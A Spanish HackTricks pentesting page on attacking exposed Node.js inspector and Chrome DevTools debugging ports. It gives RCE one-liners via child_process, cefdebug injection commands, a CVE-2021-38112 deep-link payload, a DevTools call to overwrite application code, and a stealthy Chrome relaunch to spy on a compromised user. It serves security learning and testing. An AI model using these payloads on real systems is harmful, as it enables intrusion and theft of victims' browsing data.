## Información básica

Cuando se inicia un proceso de Node.js con el interruptor `--inspect`, este escucha a un cliente de depuración. Por **defecto**, escuchará en el host y puerto **`127.0.0.1:9229`**. A cada proceso también se le asigna un **UUID** **único**.

Los clientes del inspector deben conocer y especificar la dirección del host, el puerto y el UUID para conectarse. Una URL completa se verá algo como `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Dado que el **depurador tiene acceso completo al entorno de ejecución de Node.js**, un actor malintencionado capaz de conectarse a este puerto puede ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).
{% endhint %}

Hay varias formas de iniciar un inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Cuando se inicia un proceso inspeccionado, aparecerá algo como esto:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Los procesos basados en **CEF** (**Chromium Embedded Framework**) necesitan usar el parámetro: `--remote-debugging-port=9222` para abrir el **debugger** (las protecciones SSRF siguen siendo muy similares). Sin embargo, en lugar de conceder una sesión de **debug** de **NodeJS**, se comunicarán con el navegador utilizando el [**Protocolo de Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/), que es una interfaz para controlar el navegador, pero no hay una RCE directa.

Cuando se inicia un navegador depurado, aparecerá algo como esto:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navegadores, WebSockets y política de mismo origen <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador web pueden hacer solicitudes WebSocket y HTTP bajo el modelo de seguridad del navegador. Se necesita una **conexión HTTP inicial** para **obtener un ID de sesión de depurador único**. La **política de mismo origen** **evita** que los sitios web puedan hacer **esta conexión HTTP**. Para una seguridad adicional contra [**ataques de reenvío DNS**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js verifica que los **encabezados 'Host'** para la conexión especifiquen una **dirección IP** o **`localhost`** o **`localhost6`** con precisión.

{% hint style="info" %}
Estas **medidas de seguridad evitan explotar el inspector** para ejecutar código simplemente enviando una solicitud HTTP (lo que podría hacerse explotando una vulnerabilidad SSRF).
{% endhint %}

### Iniciando el inspector en procesos en ejecución

Puede enviar la **señal SIGUSR1** a un proceso nodejs en ejecución para hacer que **inicie el inspector** en el puerto predeterminado. Sin embargo, tenga en cuenta que necesita tener suficientes privilegios, por lo que esto podría otorgarle **acceso privilegiado a la información dentro del proceso** pero no una escalada de privilegios directa.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Esto es útil en contenedores porque **apagar el proceso y comenzar uno nuevo** con `--inspect` no es una opción porque el **contenedor** será **eliminado** con el proceso.
{% endhint %}

### Conectar al inspector/debugger

Si tienes acceso a un navegador **basado en Chromium** puedes conectarte accediendo a `chrome://inspect` o `edge://inspect` en Edge. Haz clic en el botón Configure y asegúrate de que tu **host y puerto objetivo** estén listados (encuentra un ejemplo en la siguiente imagen de cómo obtener RCE usando uno de los ejemplos de las siguientes secciones).

![](<../../.gitbook/assets/image (620) (1).png>)

Usando la **línea de comandos** puedes conectarte a un debugger/inspector con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), permite **encontrar inspectores** que se estén ejecutando localmente e **inyectar código** en ellos.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Tenga en cuenta que los exploits de **NodeJS RCE no funcionarán** si está conectado a un navegador a través del [**Protocolo de Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/) (debe verificar la API para encontrar cosas interesantes que hacer con ella).
{% endhint %}

## RCE en el depurador/inspector de NodeJS

{% hint style="info" %}
Si llegaste aquí buscando cómo obtener [**RCE desde un XSS en Electron, consulta esta página.**](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
{% endhint %}

Algunas formas comunes de obtener **RCE** cuando se puede **conectar** a un **inspector** de Node es usando algo como (parece que esto **no funcionará en una conexión con el protocolo de Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Cargas útiles del Protocolo Chrome DevTools

Puede verificar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
En esta sección, solo listaré cosas interesantes que encuentre que las personas hayan utilizado para explotar este protocolo.

### Inyección de parámetros a través de enlaces profundos

En el [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security descubrió que una aplicación basada en CEF **registró un URI personalizado** en el sistema (workspaces://) que recibió el URI completo y luego **lanzó la aplicación basada en CEF** con una configuración que se construyó parcialmente a partir de ese URI.

Se descubrió que los parámetros URI se decodificaron de URL y se utilizaron para lanzar la aplicación básica de CEF, lo que permitió a un usuario **inyectar** la bandera **`--gpu-launcher`** en la **línea de comandos** y ejecutar cosas arbitrarias.

Entonces, una carga útil como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Ejecutará una calculadora.

### Sobrescribir archivos

Cambie la carpeta donde **se guardarán los archivos descargados** y descargue un archivo para **sobrescribir** el **código fuente** frecuentemente utilizado de la aplicación con su **código malicioso**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
    id: 42069,
    method: 'Browser.setDownloadBehavior',
    params: {
        behavior: 'allow',
        downloadPath: '/code/'
    }
}));
```
### RCE y exfiltración con Webdriver

Según este artículo: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), es posible obtener RCE y exfiltrar páginas internas desde el controlador.

### Post-Explotación

En un entorno real y **después de comprometer** una PC de usuario que utiliza un navegador basado en Chrome/Chromium, se podría lanzar un proceso de Chrome con la **depuración activada y reenviar el puerto de depuración** para poder acceder a él. De esta manera, se podrá **inspeccionar todo lo que la víctima hace con Chrome y robar información sensible**.

La forma sigilosa es **terminar todos los procesos de Chrome** y luego llamar a algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referencias

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
